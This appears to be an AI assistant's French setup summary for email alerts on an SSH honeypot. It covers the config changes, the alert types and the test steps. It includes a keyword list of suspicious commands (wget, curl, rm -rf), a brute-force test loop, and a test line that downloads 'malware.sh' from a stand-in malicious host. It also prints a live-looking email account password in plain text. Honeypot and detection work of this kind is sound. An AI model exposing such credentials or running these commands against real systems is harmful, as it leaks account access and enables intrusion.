# ✅ CONFIGURATION EMAIL TERMINÉE !

## 📧 INFORMATIONS DE CONFIGURATION

**Email configuré :** `HoneyPotProject@hotmail.com`  
**Service SMTP :** Outlook/Hotmail  
**Statut :** ✅ Actif et prêt à envoyer

---

## 🎯 CE QUI A ÉTÉ MODIFIÉ

### **1. `config.yaml`**
- ✅ Configuré avec tes identifiants Outlook
- ✅ SMTP Outlook : `smtp-mail.outlook.com:587`
- ✅ Alertes activées

### **2. `internal/honeypot/alerts.go`**
- ✅ Ajout de l'import `utils` pour l'envoi d'emails
- ✅ Ajout du champ `emailSender` dans `AlertManager`
- ✅ Initialisation automatique du système d'email
- ✅ Fonction `sendRealEmail()` pour envoyer de vrais emails
- ✅ Fonction `simulateEmailSend()` comme fallback

### **3. `internal/utils/email.go`**
- ✅ Modification de `sendEmailTLS()` → `sendEmailSTARTTLS()`
- ✅ Support optimal pour Outlook avec STARTTLS
- ✅ Gestion correcte du TLS pour le port 587

---

## 📮 TYPES D'ALERTES PAR EMAIL

Tu recevras un email pour :

| Type d'alerte | Sévérité | Déclencheur |
|---------------|----------|-------------|
| **successful_login** | medium | Quelqu'un se connecte avec succès |
| **failed_login** | low | Tentative de connexion échouée |
| **brute_force** | high | 5+ tentatives échouées en 5 minutes |
| **dangerous_command** | high/critical | Commandes suspectes (`wget`, `curl`, `rm -rf`, `sudo`, etc.) |

---

## 🚀 POUR LANCER LE HONEYPOT

### **Étape 1 : Rebuild avec la nouvelle configuration**
```bash
cd /home/anis/Honey/HoneyV3/Honeypot

# Rebuild l'image Docker avec la config email
docker-compose down
docker-compose up -d --build
```

### **Étape 2 : Vérifier les logs**
```bash
# Voir les logs en temps réel
docker-compose logs -f

# Tu devrais voir :
# 📧 Email alerts enabled - sending to: [HoneyPotProject@hotmail.com]
```

### **Étape 3 : Tester l'envoi d'emails**
```bash
# Lancer le script de test automatique
./test_email.sh
```

Ou manuellement :
```bash
# Test 1 : Connexion réussie
ssh -p 2222 admin@localhost
# Password: admin123

# Test 2 : Attaque brute force (6 tentatives échouées)
for i in {1..6}; do 
  sshpass -p "wrong" ssh -p 2222 test@localhost
done

# Test 3 : Commande dangereuse
ssh -p 2222 admin@localhost
# Puis tape : wget http://malicious.com/malware.sh
```

---

## 📬 VÉRIFIER LES EMAILS

1. **Va sur :** https://outlook.live.com/
2. **Connecte-toi avec :**
   - Email : `HoneyPotProject@hotmail.com`
   - Mot de passe : `AN123456ur`
3. **Vérifie ta boîte de réception**
4. **⚠️ Si rien → Vérifie les SPAMS / Courrier indésirable**

---

## 📧 EXEMPLE D'EMAIL REÇU

```
De: HoneyPotProject@hotmail.com
À: HoneyPotProject@hotmail.com
Sujet: [HONEYPOT ALERT] high - brute_force

🚨 ALERTE HONEYPOT 🚨

Type: brute_force
Sévérité: high
Message: ⚠️ ATTAQUE BRUTE FORCE DÉTECTÉE ! 6 tentatives depuis 192.168.1.50
Adresse IP: 192.168.1.50
Date: 2025-12-20 16:30:45

Détails: Username: test, Password: wrongpassword, Total attempts: 6

---
Honey SSH Honeypot
Système de surveillance automatique
```

---

## 🔧 DÉPANNAGE

### **Problème : Pas d'email reçu**

**1. Vérifie les logs du honeypot :**
```bash
docker-compose logs -f | grep -i email
```

Tu devrais voir :
```
📧 Email alerts enabled - sending to: [HoneyPotProject@hotmail.com]
📧 Sending email alert for: successful_login
✅ Email alert sent successfully to: [HoneyPotProject@hotmail.com]
```

**2. Vérifie les SPAMS**
- Les premiers emails peuvent arriver dans les spams
- Marque-les comme "Non spam" pour les prochains

**3. Vérifie la connexion réseau du conteneur**
```bash
docker-compose exec honeypot ping -c 3 smtp-mail.outlook.com
```

**4. Si erreur "Authentication failed" :**
- Vérifie que le mot de passe est correct dans `config.yaml`
- Vérifie que l'email est bien `HoneyPotProject@hotmail.com` (pas `.fr`)

---

## 🔐 SÉCURITÉ

**⚠️ IMPORTANT :**
- ✅ Le fichier `config.yaml` est dans `.gitignore` (pas de risque de leak)
- ✅ N'envoie jamais `config.yaml` sur GitHub avec tes identifiants
- ✅ Si tu partages le projet, supprime les identifiants du `config.yaml`

**Pour partager le projet sans exposer tes identifiants :**
```bash
# Créer un fichier config.yaml.example
cp config.yaml config.yaml.example

# Éditer config.yaml.example et remplacer par :
username: "VOTRE_EMAIL@outlook.com"
password: "VOTRE_MOT_DE_PASSE"
```

---

## 📊 STATISTIQUES

Une fois le honeypot lancé, tu peux voir :
- **Dashboard web :** http://localhost:8080
- **Connexions en temps réel**
- **Commandes exécutées**
- **Alertes déclenchées**
- **Emails envoyés**

---

## 🎉 C'EST PRÊT !

Ton honeypot est maintenant configuré pour envoyer de **vrais emails** !

**Prochaines étapes :**
1. ✅ Rebuild : `docker-compose up -d --build`
2. ✅ Tester : `./test_email.sh`
3. ✅ Vérifier ta boîte email
4. 🎯 Profiter des alertes en temps réel !

---

**Besoin d'aide ?** Vérifie les logs : `docker-compose logs -f`


